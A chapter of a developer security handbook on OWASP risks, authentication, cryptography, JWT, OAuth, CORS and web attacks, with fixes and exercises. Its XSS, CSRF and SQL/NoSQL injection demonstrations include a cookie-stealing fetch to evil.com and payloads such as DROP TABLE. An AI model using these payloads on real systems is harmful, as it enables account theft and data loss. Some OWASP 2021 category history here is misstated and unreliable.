# Part 17: Security

> 💡 **Pro Tip:** Security is not a feature — it's a mindset. The most expensive security fixes are the ones made after deployment. Adopt a "shift left" approach by integrating security reviews, SAST (Static Application Security Testing), and dependency scanning into your CI/CD pipeline from day one.

> ✅ **Best Practice:** Always follow the Principle of Least Privilege (PoLP). Every user, process, and service should have only the minimum permissions necessary to function. This limits blast radius in case of compromise.

## Chapter 1: OWASP Top 10 (2021)

The OWASP Top 10 is a standard awareness document for web application security. First published in 2003, it is updated every 3–4 years by a global community of security experts. The 2021 edition introduced a new category structure, grouping related vulnerabilities and retiring the "A8: Insecure Deserialization" as a standalone category (now folded into "Security Misconfiguration" and "Injection").

> ❓ **Interview Question:** Why did OWASP move XXE (XML External Entities) into the "Injection" category in 2021? What does this tell you about how the industry's understanding of the vulnerability evolved?

### A01: Broken Access Control

```python
# Vulnerable
@app.get("/api/user/{user_id}")
def get_user(user_id):
    return get_user_from_db(user_id)  # No access check!

# Fixed
@app.get("/api/user/{user_id}")
def get_user(user_id, current_user=Depends(get_current_user)):
    if current_user.id != user_id and not current_user.is_admin:
        raise HTTPException(status_code=403, detail="Access denied")
    return get_user_from_db(user_id)
```

### A02: Cryptographic Failures

```python
# Vulnerable: Storing passwords in plaintext
user.password = "plaintext_password"

# Fixed: Using proper hashing
from passlib.hash import bcrypt
hashed = bcrypt.hash("user_password")
user.password_hash = hashed
bcrypt.verify("user_password", hashed)  # True
```

### A03: Injection

```python
# Vulnerable: SQL Injection
query = f"SELECT * FROM users WHERE email = '{user_input}'"

# Fixed: Parameterized query
cursor.execute("SELECT * FROM users WHERE email = %s", (user_input,))
```

### A04: Insecure Design

```python
# Vulnerable: No rate limiting on password reset
@app.post("/forgot-password")
def forgot_password(email: str):
    send_reset_email(email)

# Fixed: Rate limiting
@app.post("/forgot-password")
@rate_limit(max_requests=3, window_minutes=60)
def forgot_password(email: str, captcha: str):
    verify_captcha(captcha)
    send_reset_email(email)
```

### A05: Security Misconfiguration

```yaml
# Vulnerable: Default credentials, debug mode in production
DEBUG = True
SECRET_KEY = "default_key"

# Fixed
DEBUG = False
SECRET_KEY = os.getenv("SECRET_KEY")
```

### A07: Authentication Failures

```python
# Vulnerable: Weak password policy
password = "password123"

# Fixed: Strong password policy
from password_strength import PasswordPolicy
policy = PasswordPolicy.from_names(length=12, uppercase=1, numbers=1, special=1)
policy.validate(password)
```

### A10: SSRF

```python
# Vulnerable
@app.post("/fetch-url")
def fetch_url(url: str):
    response = requests.get(url)
    return response.text

# Fixed: Allowlist URL validation
ALLOWED_DOMAINS = ["api.example.com"]
@app.post("/fetch-url")
def fetch_url(url: str):
    parsed = urlparse(url)
    if parsed.hostname not in ALLOWED_DOMAINS:
        raise HTTPException(status_code=400)
    if parsed.hostname in ["169.254.169.254", "localhost"]:
        raise HTTPException(status_code=400)
    response = requests.get(url, timeout=5)
    return response.text
```

### Real World Analogy: The Office Building

Think of the OWASP Top 10 as a security audit checklist for a corporate office building:
- **Broken Access Control (A01)** — A janitor's key that also opens the CEO's safe
- **Cryptographic Failures (A02)** — Storing the building master key in a glass case
- **Injection (A03)** — A visitor who talks their way past security by pretending to be a repair person
- **Insecure Design (A04)** — A lobby with no security camera coverage
- **Security Misconfiguration (A05)** — Leaving the fire escape door unlocked at night
- **SSRF (A10)** — Using the mailroom's outgoing service to have packages delivered to someone's home address

### Practical Exercises

1. **OWASP Juice Shop**: Install and run the OWASP Juice Shop (a deliberately vulnerable Node.js app) and exploit at least 3 of the Top 10 vulnerabilities
2. **Vulnerability Scan**: Run OWASP ZAP against a test application and document all findings with severity levels
3. **Fix Challenge**: Given a vulnerable code snippet containing an injection flaw, write the corrected version with input validation, parameterized queries, and output encoding
4. **Threat Modeling**: Create a simple threat model for a ride-sharing app using STRIDE methodology (Spoofing, Tampering, Repudiation, Information Disclosure, Denial of Service, Elevation of Privilege)

### Revision Notes

- OWASP Top 10 is updated every 3-4 years; always check the latest version
- A01 Broken Access Control moved to the top in 2021 — it was the most common finding in real-world pentests
- Injection dropped from A01 to A03, not because it's less dangerous, but because frameworks now provide better built-in protections
- SSRF (A10) is a new entrant driven by cloud-native architecture attacks

> ⚠️ **Warning:** Don't treat the OWASP Top 10 as a complete security checklist. It represents the *most critical* risks, not *all* risks. Real-world applications face hundreds of additional vulnerabilities (e.g., race conditions, business logic flaws, prototype pollution in JS) that fall outside this list.

---

## Chapter 2: Authentication

### Password Hashing

```python
from passlib.hash import bcrypt, argon2, scrypt

# bcrypt (recommended)
hashed = bcrypt.hash("user_password")
bcrypt.verify("user_password", hashed)  # True

# Argon2 (PHC winner)
hashed = argon2.hash("user_password")
argon2.verify("user_password", hashed)

# scrypt (memory-hard)
hashed = scrypt.hash("user_password")
scrypt.verify("user_password", hashed)
```

### MFA (TOTP)

```python
import pyotp
import qrcode

secret = pyotp.random_base32()
totp = pyotp.TOTP(secret)
uri = totp.provisioning_uri("user@example.com", issuer_name="MyApp")
qr = qrcode.make(uri)
qr.save("mfa_qr.png")

# Verify
token = input("Enter 6-digit code: ")
is_valid = totp.verify(token)
```

### WebAuthn / Passkeys

```python
# WebAuthn registration (server-side verification)
from webauthn import generate_registration_options, verify_registration_response
from webauthn.helpers.structs import RegistrationCredential

options = generate_registration_options(
    rp_id="example.com",
    rp_name="MyApp",
    user_id=b"user123",
    user_name="user@example.com",
)

# Verify authenticator response
credential = RegistrationCredential(
    id=response["id"],
    raw_id=response["rawId"],
    response=response["response"],
    type="public-key",
)
verified = verify_registration_response(
    credential=credential,
    expected_challenge=options.challenge,
    expected_origin="https://example.com",
    expected_rp_id="example.com",
)
```

> ✅ **Best Practice:** Always implement account lockout (e.g., 5 failed attempts = 15-minute lock) and rate-limit login endpoints. Brute-force attacks are trivially automated — without rate limiting, an attacker can try thousands of passwords per second.

> ⚠️ **Warning:** SMS-based 2FA is better than nothing but is vulnerable to SIM-swapping attacks. TOTP (Google Authenticator, Authy) or hardware security keys (YubiKey) are significantly more secure. NIST deprecates SMS as an out-of-band verification method.

### Real World Analogy: The Airport Security Checkpoint

Authentication is like entering a secure area at an airport:
- **Password** = Your boarding pass (something you have)
- **MFA/TOTP** = Your passport (something you are / additional verification)
- **WebAuthn/Passkeys** = Biometric scan + physical ID card (hard to forge)
- **Session Token** = The wristband you get after clearing security
- **Account Lockout** = Being flagged after too many failed ID checks

### Practical Exercises

1. **Implement MFA**: Add TOTP-based MFA to a sample Flask/FastAPI application using `pyotp` and `qrcode`
2. **Password Policy**: Create a password strength meter that evaluates entropy, checks against common password lists, and enforces NIST SP 800-63 guidelines
3. **WebAuthn Demo**: Set up a simple WebAuthn registration and authentication flow using a browser's built-in biometric or security key
4. **Session Management Audit**: Review a web framework's default session handling — identify session fixation vulnerabilities and implement secure session regeneration on login

### Revision Notes

- Always hash passwords with a slow, salted algorithm (bcrypt/argon2/scrypt) — never MD5, SHA-1, or unsalted SHA-256
- MFA is non-negotiable for production systems handling sensitive data
- WebAuthn/Passkeys are phishing-resistant and increasingly supported by all major browsers and platforms
- Session tokens should be cryptographically random, stored in HTTP-only/Secure cookies, and rotated on privilege escalation

---



## Chapter 3: Authorization

### RBAC

```python
from enum import Enum
from functools import wraps

class Role(Enum):
    ADMIN = "admin"
    MODERATOR = "moderator"
    USER = "user"
    GUEST = "guest"

PERMISSIONS = {
    "read:posts": [Role.GUEST, Role.USER, Role.MODERATOR, Role.ADMIN],
    "create:posts": [Role.USER, Role.MODERATOR, Role.ADMIN],
    "delete:posts": [Role.MODERATOR, Role.ADMIN],
    "manage:users": [Role.ADMIN],
}

def require_permission(permission):
    def decorator(func):
        @wraps(func)
        def wrapper(*args, **kwargs):
            current_user = get_current_user()
            if current_user.role not in PERMISSIONS[permission]:
                raise PermissionError(f"Missing permission: {permission}")
            return func(*args, **kwargs)
        return wrapper
    return decorator
```

### ABAC

```python
class ABACPolicy:
    def __init__(self):
        self.rules = []

    def add_rule(self, effect, action, resource, conditions):
        self.rules.append({"effect": effect, "action": action, "resource": resource, "conditions": conditions})

    def evaluate(self, subject, action, resource, context):
        for rule in self.rules:
            if rule["action"] == action and rule["resource"] == resource:
                if all(cond(subject, resource, context) for cond in rule["conditions"]):
                    return rule["effect"] == "allow"
        return False

policy = ABACPolicy()
policy.add_rule("allow", "view", "document", [
    lambda s, r, c: s.department == r.department,
    lambda s, r, c: r.classification <= s.clearance
])
```

### Real World Analogy: The Hotel Key Card

- **RBAC** = Room key that opens only your floor (role-based access — "guest" opens lobby, "staff" opens back office)
- **ABAC** = A smart badge that opens a room only if: it's during business hours AND you're from the same department AND the room isn't already booked. More conditions = finer control
- **ReBAC** = If you're on the "Project X" team, you automatically get access to the Project X wiki — access is relationship-based

> ❓ **Interview Question:** You're designing authorization for a multi-tenant SaaS platform. Tenants should only see their own data, but admins can view all tenants for support. Would you use RBAC, ABAC, or a combination? Defend your choice.

> ✅ **Best Practice:** Prefer deny-by-default policies. If a user doesn't have explicit permission for an action, the system should deny it. Never rely on implicit "if not allowed then allow" logic — that's how privilege escalation happens.

### Practical Exercises

1. **RBAC Implementation**: Build a role-based access system for a blog platform with Admin, Author, Editor, and Reader roles, each with specific CRUD permissions on posts and comments
2. **ABAC Policy Engine**: Create an ABAC system where document access depends on user department, document classification level, time of day, and IP range
3. **Audit Log**: Implement an authorization audit log that records every access decision (who, what, when, allowed/denied) — essential for compliance (SOC 2, HIPAA)

### Revision Notes

- RBAC is simpler to implement but becomes unwieldy with many roles (role explosion)
- ABAC provides fine-grained control but requires a policy engine (OPA, Casbin, AWS Cedar)
- Always log authorization failures for security monitoring
- Cache permission decisions but invalidate aggressively on role changes

---

## Chapter 4: Encryption

### Symmetric Encryption

```python
from cryptography.fernet import Fernet
from Crypto.Cipher import AES, ChaCha20_Poly1305

# AES-GCM
def encrypt_aes_gcm(key, plaintext):
    cipher = AES.new(key, AES.MODE_GCM)
    ciphertext, tag = cipher.encrypt_and_digest(plaintext)
    return cipher.nonce + tag + ciphertext

def decrypt_aes_gcm(key, data):
    nonce, tag, ciphertext = data[:16], data[16:32], data[32:]
    cipher = AES.new(key, AES.MODE_GCM, nonce=nonce)
    return cipher.decrypt_and_verify(ciphertext, tag)

# Fernet
key = Fernet.generate_key()
fernet = Fernet(key)
token = fernet.encrypt(b"my secret data")
decrypted = fernet.decrypt(token)
```

### Asymmetric Encryption

```python
from cryptography.hazmat.primitives.asymmetric import rsa, ec, ed25519
from cryptography.hazmat.primitives import hashes

# RSA Key Generation
private_key = rsa.generate_private_key(public_exponent=65537, key_size=2048)
public_key = private_key.public_key()

# ECDSA Signing
private_key = ec.generate_private_key(ec.SECP256R1())
signature = private_key.sign(b"message", ec.ECDSA(hashes.SHA256()))
public_key = private_key.public_key()
public_key.verify(signature, b"message", ec.ECDSA(hashes.SHA256()))

# Ed25519
private_key = ed25519.Ed25519PrivateKey.generate()
signature = private_key.sign(b"message")
public_key = private_key.public_key()
public_key.verify(signature, b"message")
```

### Key Derivation

```python
from cryptography.hazmat.primitives.kdf.pbkdf2 import PBKDF2HMAC
import os

# PBKDF2
salt = os.urandom(16)
kdf = PBKDF2HMAC(algorithm=hashes.SHA256(), length=32, salt=salt, iterations=600000)
key = kdf.derive(b"password")

# Argon2id
from argon2 import PasswordHasher
ph = PasswordHasher()
hash = ph.hash("password")
ph.verify(hash, "password")
```

> 💡 **Pro Tip:** You don't always need encryption for everything. For data that must be fast, consider tokenization (replacing sensitive data with a non-sensitive placeholder) instead. PCI-DSS compliant systems often tokenize credit card numbers — the actual PAN is stored in a secure vault, and your app only ever sees a meaningless token.

> ⚠️ **Warning:** Never roll your own cryptography. AES, RSA, ECDSA, ChaCha20-Poly1305 — these algorithms have been battle-tested by thousands of cryptographers over decades. Homegrown algorithms and custom implementations are the #1 cause of cryptographic failures in production. Use well-audited libraries (Cryptography.io, libsodium, Bouncy Castle).

### Real World Analogy: The Locked Box and the Post Office

- **Symmetric Encryption** = You put a letter in a box, lock it with a padlock, and mail it. The recipient needs an identical copy of your padlock key to open it. Fast, but you both need the same key.
- **Asymmetric Encryption** = You give everyone an open padlock (public key) but keep the only key that opens it (private key). Anyone can lock a message, but only you can unlock it.
- **Digital Signatures** = You write a check and sign it. Anyone can verify the signature is yours (by checking against your known signature card), but no one can forge it without your pen.
- **TLS 1.3** = You and the recipient agree on a secret key using public-key crypto, then switch to fast symmetric encryption for the actual conversation — like using the post office to securely exchange a box key, then using that key for all future letters.

### Practical Exercises

1. **AES-GCM in Action**: Write a Python script that encrypts a file with AES-256-GCM, saves the nonce + ciphertext + tag, then decrypts and verifies it
2. **Certificate Chain Inspection**: Use OpenSSL to inspect a real website's certificate chain: `openssl s_client -connect example.com:443 -showcerts`
3. **Hybrid Encryption**: Implement a hybrid encryption system: generate an RSA key pair, encrypt an AES key with RSA, encrypt a message with AES-GCM, then package all parts together
4. **KDF Comparison**: Benchmark PBKDF2 (100K iterations), bcrypt (cost=12), and Argon2id (time=3, mem=64MB) to understand the performance cost of each KDF

### Revision Notes

- AES-GCM is the recommended symmetric cipher — provides both encryption and authentication (AEAD)
- RSA is slow and requires large key sizes (2048+ bits). ECDSA/Ed25519 are faster with smaller keys for equivalent security
- TLS 1.3 reduces handshake latency to 1-RTT (or 0-RTT for returning clients) and removes insecure ciphers
- Key derivation functions (PBKDF2, bcrypt, Argon2) are designed to be slow — that's a feature for password storage
- Never use ECB mode for AES (it's not semantically secure — identical plaintext blocks produce identical ciphertext)

---

## Chapter 5: JWT

```python
import jwt
import time

header = {"alg": "RS256", "typ": "JWT"}
payload = {
    "sub": "user123",
    "name": "John Doe",
    "iat": int(time.time()),
    "exp": int(time.time()) + 3600,
    "roles": ["admin", "editor"]
}

private_key = open("private.pem").read()
token = jwt.encode(payload, private_key, algorithm="RS256", headers=header)

public_key = open("public.pem").read()
try:
    decoded = jwt.decode(token, public_key, algorithms=["RS256"])
except jwt.ExpiredSignatureError:
    print("Token expired")

# Refresh tokens
ACCESS_EXPIRY = 900  # 15 min
REFRESH_EXPIRY = 604800  # 7 days
def create_tokens(user_id):
    access = jwt.encode({"sub": user_id, "type": "access", "exp": time.time() + ACCESS_EXPIRY}, PRIVATE_KEY, algorithm="RS256")
    refresh = jwt.encode({"sub": user_id, "type": "refresh", "exp": time.time() + REFRESH_EXPIRY}, PRIVATE_KEY, algorithm="RS256")
    return access, refresh

# JWT Blacklisting (for logout)
import redis

r = redis.Redis()
def logout(token_jti: str, exp: int):
    ttl = exp - int(time.time())
    if ttl > 0:
        r.setex(f"blacklist:{token_jti}", ttl, "true")

def is_blacklisted(token_jti: str) -> bool:
    return r.exists(f"blacklist:{token_jti}") > 0
```

> ⚠️ **Warning:** Never use the `alg: "none"` algorithm in JWT. Some JWT libraries have been vulnerable to algorithm confusion attacks — where an attacker changes the algorithm from RS256 (asymmetric) to HS256 (symmetric), and the server uses the public key (which the attacker knows) as the HMAC secret to verify the token. Always pin the expected algorithm on the server side using `jwt.decode(token, public_key, algorithms=["RS256"])`.

> ❓ **Interview Question:** Your colleague argues that JWTs should have a 30-day expiry to avoid forcing users to log in frequently. What security concerns would you raise, and how would you design a session system that balances security with user experience?

> ✅ **Best Practice:** Use RS256 (RSA) or ES256 (ECDSA) for JWT signing, NOT HS256 (HMAC). With asymmetric algorithms, the private key stays on your server and the public key can be distributed freely. With HS256, anyone who has the secret key can forge tokens — and mobile apps have to embed that secret.

### Real World Analogy: The VIP Wristband

A JWT is like a VIP wristband at a music festival:
- **Header** = The wristband material and color scheme (identifies how it was made)
- **Payload** = Your name, seat section, and access level printed on the wristband
- **Signature** = An invisible watermark that security can verify but no one can forge
- **Expiry** = The wristband disintegrates after 24 hours
- **Refresh Token** = Your physical ID that lets you get a new wristband when yours expires
- **Blacklist** = A list of wristband serial numbers that have been reported lost/stolen

### Practical Exercises

1. **JWT Implementation**: Build a complete auth system with access tokens (15 min) and refresh tokens (7 days), including token rotation on refresh
2. **Algorithm Confusion Attack**: Create a vulnerable JWT endpoint and demonstrate the "alg:none" and RS256→HS256 confusion attacks, then fix them
3. **Blacklist + Logout**: Implement server-side JWT blacklisting using Redis, including a `/logout` endpoint that invalidates the current token

### Revision Notes

- JWT payload is base64-encoded, NOT encrypted — never store secrets in the payload
- Short-lived access tokens (15-30 min) + long-lived refresh tokens (7-30 days) is the standard pattern
- Token rotation: every time a refresh token is used, issue a new refresh token and invalidate the old one
- JWT blacklisting requires server-side state (Redis), which partially defeats the statelessness benefit of JWTs

---

## Chapter 6: OAuth 2.0

### Authorization Code Flow

```python
import requests

def exchange_code_for_token(auth_code):
    response = requests.post("https://auth.example.com/token", data={
        "grant_type": "authorization_code",
        "code": auth_code,
        "client_id": "myapp",
        "client_secret": "myapp_secret",
        "redirect_uri": "https://myapp.com/callback"
    })
    return response.json()
```

### PKCE

```python
import hashlib
import base64
import os

code_verifier = base64.urlsafe_b64encode(os.urandom(32)).rstrip(b"=").decode()
code_challenge = base64.urlsafe_b64encode(hashlib.sha256(code_verifier.encode()).digest()).rstrip(b"=").decode()

def exchange_with_pkce(auth_code, code_verifier):
    response = requests.post("https://auth.example.com/token", data={
        "grant_type": "authorization_code",
        "code": auth_code,
        "client_id": "myapp",
        "code_verifier": code_verifier,
        "redirect_uri": "https://myapp.com/callback"
    })
    return response.json()
```

### Client Credentials

```python
def get_client_credentials_token():
    response = requests.post("https://auth.example.com/token", data={
        "grant_type": "client_credentials",
        "client_id": "my_service",
        "client_secret": "service_secret",
        "scope": "api:read api:write"
    })
    return response.json()["access_token"]
```

| Flow | Use Case | Security |
|------|----------|----------|
| Authorization Code | Web apps with backend | High |
| PKCE | Mobile/SPA apps | High |
| Client Credentials | Service-to-service | Medium |
| Implicit (deprecated) | Legacy SPAs | Low |

> ✅ **Best Practice:** Always use PKCE, even for server-side web apps. PKCE protects against authorization code interception attacks and was originally designed for mobile/SPA, but the OAuth 2.0 Security Best Current Practice (BCP) now recommends it for all OAuth clients — even confidential ones. It adds no meaningful complexity and closes a real attack vector.

> ❓ **Interview Question:** A mobile app using OAuth 2.0 Authorization Code flow without PKCE is intercepted by a malicious app on the same device that receives the authorization code callback. How does PKCE prevent this attacker from exchanging the code for a token?

> 💡 **Pro Tip:** For service-to-service auth in a microservice architecture, consider mTLS (mutual TLS) instead of client credentials grant. mTLS authenticates both sides of the connection at the transport layer, is resistant to token leakage, and doesn't require a token endpoint. Kubernetes service meshes (Istio, Linkerd) make this trivially configurable.

### Real World Analogy: The Hotel Concierge

OAuth 2.0 is like a hotel concierge service:
- **Resource Owner** = You (the guest)
- **Client** = The tour booking desk in the lobby
- **Authorization Server** = The hotel front desk that verifies your identity
- **Resource Server** = The pool/gym that only admits verified guests
- **Authorization Code** = A claim ticket the front desk gives you
- **Access Token** = A day-pass wristband for the pool
- **PKCE** = The front desk also writes a matching serial number on your claim ticket and their copy — a stolen ticket without the matching number is useless
- **Client Credentials** = Two hotel employees (both trusted) exchanging a master key directly

### Practical Exercises

1. **OAuth Dance**: Set up a complete OAuth 2.0 Authorization Code flow using GitHub as the provider — register an OAuth app, handle the callback, and fetch the user's profile
2. **PKCE from Scratch**: Implement PKCE code challenge/verifier generation in Python and test the full flow against a provider that supports it (Auth0, Google)
3. **Token Exchange**: Build a simple token exchange service where an auth code is exchanged for access + refresh tokens, with proper error handling for expired/invalid codes

### Revision Notes

- Authorization Code flow (with PKCE) is the gold standard — use it for everything
- Implicit grant is deprecated (OAuth 2.1 removes it entirely) — never use it
- Scopes are the primary mechanism for least-privilege access; request only scopes you need
- OAuth is about *delegation*, not authentication — use OpenID Connect (OIDC) on top of OAuth 2.0 for authentication

---

## Chapter 7: HTTPS and CORS

### TLS Handshake

```
Client                      Server
  |                           |
  |  ClientHello              |
  |-------------------------->|
  |  ServerHello + Cert       |
  |<--------------------------|
  |  Key Exchange (ECDHE)     |
  |-------------------------->|
  |  Finished (encrypted)     |
  |<=========================>|
  |  Application Data         |
```

### CORS Configuration

```python
from fastapi.middleware.cors import CORSMiddleware

app.add_middleware(CORSMiddleware,
    allow_origins=["https://app.example.com"],
    allow_credentials=True,
    allow_methods=["GET", "POST", "PUT", "DELETE"],
    allow_headers=["Authorization", "Content-Type"],
    max_age=600
)
```

> ⚠️ **Warning:** Never use `Access-Control-Allow-Origin: *` with `Access-Control-Allow-Credentials: true`. The browser will reject this combination entirely — and even if it worked, it would expose authenticated responses to any origin. If you need credentials, you must explicitly list the origin.

> ❓ **Interview Question:** Your API returns CORS headers correctly for `GET` requests, but `PUT` requests fail in the browser with a CORS error. What's happening, and how does the preflight (`OPTIONS`) request play into this?

### Real World Analogy: The Bouncer and the Passport

HTTPS + CORS is like a nightclub's security system:
- **TLS Handshake** = The bouncer checks your ID and verifies it's authentic (not a fake)
- **Certificate** = Your passport — issued by a trusted authority (CA)
- **CORS Preflight** = Your friend calls ahead to make sure the club accepts out-of-state IDs — the bouncer answers "yes, we accept them for entry but not for the VIP section"
- **CORS Headers** = The club posting a sign: "We serve patrons from these 3 nearby hotels, but not walk-ins from the street"
- **mTLS** = Both you AND the bouncer show ID — you verify the club is legitimate too (important for preventing phishing)

### Practical Exercises

1. **TLS Setup**: Generate a self-signed certificate, configure Nginx/Caddy to serve HTTPS with TLS 1.3, and verify with `curl -vI https://localhost`
2. **CORS Debugging**: Create a simple HTML page at one origin that tries to fetch from another origin with various CORS configurations — debug why some requests fail
3. **HSTS Header**: Add Strict-Transport-Security header to your web app and test with `securityheaders.com`

### Revision Notes

- TLS 1.3 is the current standard; disable SSLv3, TLS 1.0, and TLS 1.1
- Use Let's Encrypt (ACME protocol) for free, auto-renewing certificates
- CORS is a browser-enforced policy — it does NOT protect your API from non-browser clients (curl, Postman, server-to-server calls)
- HSTS preload list ensures browsers always use HTTPS for your domain, even on first visit
- For internal APIs, consider skipping CORS entirely and using mTLS or a service mesh

---



## Chapter 8: XSS, CSRF, SQL Injection

### XSS (Cross-Site Scripting)

#### Attack Demonstration (Stored XSS)
```html
<!-- User submits a comment with malicious script -->
<form action="/comment" method="POST">
  <textarea name="body">
    <!-- This JavaScript executes in every visitor's browser -->
    <script>
      fetch('https://evil.com/steal?cookie=' + document.cookie);
    </script>
    Great article!
  </textarea>
</form>

<!-- Without sanitization, the raw HTML is rendered on the page -->
<div class="comment">
  <script>
    fetch('https://evil.com/steal?cookie=' + document.cookie);
  </script>
  Great article!
</div>
```

#### Reflected XSS
```html
<!-- Victim clicks a crafted link -->
<!-- https://example.com/search?q=<script>alert('xss')</script> -->

<!-- Vulnerable server returns: -->
<div>Search results for: <script>alert('xss')</script></div>
```

#### DOM-Based XSS
```javascript
// Vulnerable — reading from URL and inserting into DOM
const user = new URLSearchParams(window.location.search).get('name');
document.getElementById('greeting').innerHTML = `Hello, ${user}!`;

// Attacker crafts: https://example.com/profile?name=<img src=x onerror=alert(1)>
// The image onerror handler executes the attacker's JavaScript
```

### XSS Prevention

```python
import html
from bleach import clean

# Escape output
safe_input = html.escape(user_input)

# Sanitize HTML
safe_html = clean(user_input, tags=["p", "b", "i"], strip=True)

# CSP Headers
response.headers["Content-Security-Policy"] = (
    "default-src 'self'; "
    "script-src 'self'; "
    "object-src 'none'"
)
```

> ❓ **Interview Question:** A colleague says "We use React with proper JSX escaping, so we don't need to worry about XSS." Why is this statement dangerously incomplete? What attack surfaces still exist in a modern SPA?

> ✅ **Best Practice:** Defense in depth for XSS:
> 1. **Input validation** — reject or sanitize untrusted input at the entry point
> 2. **Output encoding** — context-aware encoding (HTML entity, JavaScript, CSS, URL)
> 3. **CSP headers** — restrict what scripts can execute (even if injected)
> 4. **HttpOnly cookies** — prevent JavaScript from reading auth cookies
> 5. **Trusted Types** (browser API) — prevent DOM XSS by enforcing that HTML assignments come only from trusted sinks

### CSRF (Cross-Site Request Forgery)

#### Attack Demonstration
```html
<!-- The attacker's malicious page -->
<img src="https://bank.example.com/transfer?to=attacker&amount=10000"
     style="display:none;"
     onerror="
       // If IMG doesn't work, try form submission
       const form = document.createElement('form');
       form.method = 'POST';
       form.action = 'https://bank.example.com/transfer';
       form.innerHTML = '<input name=to value=attacker><input name=amount value=10000>';
       document.body.appendChild(form);
       form.submit();
     ">

<!-- If the victim is logged into bank.example.com, their cookies send automatically -->
<!-- The server processes the transfer — CSRF in action! -->
```

### CSRF Prevention

```python
import secrets

def generate_csrf_token():
    return secrets.token_urlsafe(32)

# SameSite Cookies
response.set_cookie(key="session", value=session_id, httponly=True, secure=True, samesite="lax")

# Double-Submit Cookie
@app.post("/api/transfer")
def transfer_money(csrf_cookie: str = Cookie(None), csrf_header: str = Header(None)):
    if not csrf_cookie or not csrf_header:
        raise HTTPException(status_code=403)
    if not hmac.compare_digest(csrf_cookie, csrf_header):
        raise HTTPException(status_code=403)

# Anti-CSRF Token (server-rendered forms)
def csrf_token():
    token = secrets.token_urlsafe(32)
    session["csrf_token"] = token
    return token

# In template:
# <form method="POST">
#   <input type="hidden" name="csrf_token" value="{{ csrf_token() }}">
# </form>
```

> ⚠️ **Warning:** Modern browser SameSite cookie attribute (`SameSite=Lax` default in Chrome 80+) prevents CSRF for most use cases, but don't rely on it exclusively. SameSite=Strict can break legitimate cross-site navigation, and SameSite=None (required for cross-origin iframes) provides no CSRF protection. Always layer CSRF tokens on top of SameSite.

### SQL Injection

#### Attack Demonstration
```python
# Vulnerable endpoint
@app.post("/login")
def login(username: str, password: str):
    # Attacker enters: admin' --  (closes the quote and comments out the rest)
    # Or worse: ' OR 1=1 --
    query = f"SELECT * FROM users WHERE username = '{username}' AND password = '{password}'"
    # Becomes: SELECT * FROM users WHERE username = 'admin' --' AND password = ''
    # The -- comments out the password check! Attacker logs in as admin without knowing the password.
    
    # Even worse: '; DROP TABLE users; --
    # Or: ' UNION SELECT * FROM credit_cards --
    cursor.execute(query)
    return cursor.fetchone()
```

### SQL Injection Prevention

```python
# Parameterized queries
cursor.execute("SELECT * FROM users WHERE email = %s AND password = %s", (email, password))

# ORM (safe)
user = User.query.filter_by(email=email, password=password).first()

# Input validation
class LoginRequest(BaseModel):
    email: EmailStr
    password: constr(min_length=8, max_length=128)
```

### NoSQL Injection
```python
# Vulnerable MongoDB query
user_input = request.json.get("username")
# Attacker sends: {"$gt": ""} — matches all users!
users = db.users.find({"username": user_input})

# Fixed: Use typed input validation
from pydantic import BaseModel, constr

class UserQuery(BaseModel):
    username: str  # Pydantic will reject dict/$operators

users = db.users.find({"username": query.username})
```

> ✅ **Best Practice:** Use an ORM/ODM (SQLAlchemy, Prisma, Django ORM, Mongoose) with parameterized queries as your default. ORMs automatically escape inputs and prevent injection. Only write raw queries when the ORM can't express the query, and ALWAYS use parameterized placeholders.

> 💡 **Pro Tip:** Use a **WAF (Web Application Firewall)** like Cloudflare, AWS WAF, or ModSecurity as a defense-in-depth layer. A WAF can detect and block common injection patterns, XSS payloads, and known attack signatures before they reach your application. This buys you time to fix the underlying vulnerability.

### Real World Analogy: The Trusting Receptionist

- **XSS** = A visitor walks into the office and the receptionist displays their message verbatim on the lobby TV — including the note "open the safe and steal the cash"
- **CSRF** = An attacker calls the office pretending to be you and says "I need you to transfer funds" — the receptionist does it because they think it's you
- **SQL Injection** = A visitor says "I'm here to see John — actually, let me just walk into every room and look at all the files" and the receptionist says "sure, go ahead"
- **NoSQL Injection** = A visitor hands the receptionist a blank name tag and says "fill this in with any name" — the receptionist writes "CEO" and gives them full access

### Practical Exercises

1. **XSS Lab**: Deploy DVWA (Damn Vulnerable Web Application) and exploit stored, reflected, and DOM-based XSS vulnerabilities, then fix each with proper sanitization
2. **CSRF Exploit**: Create a malicious HTML page that performs a state-changing action (transfer, delete, change email) on a vulnerable test app, then implement CSRF tokens to prevent it
3. **SQL Injection Lab**: Use SQLMap against a deliberately vulnerable app and observe how it extracts database structure, then implement parameterized queries to make it invulnerable
4. **CSP Builder**: Create a Content-Security-Policy header that blocks inline scripts while allowing your application's legitimate scripts, test it with `CSP Evaluator`

### Revision Notes

- XSS has 3 types: Stored (persistent), Reflected (non-persistent), DOM-based (client-side only)
- CSRF is prevented by SameSite cookies + CSRF tokens + custom headers + Referer/Origin validation
- SQL Injection is prevented by parameterized queries (NOT string concatenation or escaping)
- CSP provides defense in depth: even if XSS is injected, CSP can block it from executing
- Modern frameworks (React, Vue, Svelte) auto-escape by default, but `dangerouslySetInnerHTML` and `v-html` bypass this — use them with extreme caution
- OWASP has a dedicated **XSS Filter Evasion Cheat Sheet** — read it to understand how sophisticated real-world attacks can be

---

## Chapter 9: Secrets Management

### HashiCorp Vault

```python
import hvac

client = hvac.Client(url="https://vault.example.com:8200")
client.token = os.getenv("VAULT_TOKEN")

# Write/Read secrets
client.secrets.kv.v2.create_or_update_secret(path="myapp/prod", secret={"db_password": "super_secret"})
secret = client.secrets.kv.v2.read_secret_version(path="myapp/prod")
db_password = secret["data"]["data"]["db_password"]
```

### Environment Variables

```python
import os
from dotenv import load_dotenv

load_dotenv()
DATABASE_URL = os.getenv("DATABASE_URL")
SECRET_KEY = os.getenv("SECRET_KEY")
```

### AWS Secrets Manager

```python
import boto3

def get_secret(secret_name):
    client = boto3.session.Session().client(service_name="secretsmanager")
    response = client.get_secret_value(SecretId=secret_name)
    return json.loads(response["SecretString"])
```

---

### Git Secrets Detection (git-secrets, truffleHog)

```bash
# Install git-secrets
git secrets --install
git secrets --register-aws  # Adds AWS secret patterns

# Scan repository history with truffleHog
docker run --rm -v $(pwd):/src us-central1-docker.pkg.dev/trufflehog-421118/docker-images/trufflehog:latest \
  trufflehog filesystem /src --results=verified,unknown

# .gitignore patterns for secrets
echo ".env
*.pem
*.key
credentials.json
service-account.json" >> .gitignore
```

